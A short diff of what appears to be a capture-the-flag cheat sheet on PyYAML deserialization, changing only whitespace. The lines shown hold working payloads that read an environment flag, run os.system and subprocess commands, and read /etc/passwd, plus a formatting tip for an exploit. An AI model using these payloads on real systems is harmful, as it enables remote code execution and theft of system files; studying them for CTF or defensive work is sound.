@@ -17,7 +17,7 @@ tricks:
         url: !!python/object/apply:os.getenv [FLAG]
     notes: |
       CRITICAL: YAML payload must start with '- !!' directly, NO leading newline!
-      
+
       Python exploit:
       ```python
       import requests, base64
@@ -36,9 +36,9 @@ tricks:
     payload: |
       # Execute command:
       !!python/object/apply:subprocess.check_output [[cat, /etc/passwd]]
-      
+
       # Read file:
       !!python/object/apply:builtins.open [/etc/passwd]
-      
+
       # Import and call:
       !!python/object/apply:os.system [id]
